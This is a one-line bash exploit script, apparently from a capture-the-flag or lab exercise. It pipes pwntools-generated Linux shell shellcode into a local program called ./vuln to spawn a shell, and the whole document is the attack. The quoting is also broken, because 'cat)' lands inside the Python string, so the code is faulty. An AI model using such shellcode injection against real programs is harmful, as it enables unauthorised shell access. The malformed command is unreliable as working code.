#!/bin/bash

(python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh())); cat)" | ./vuln
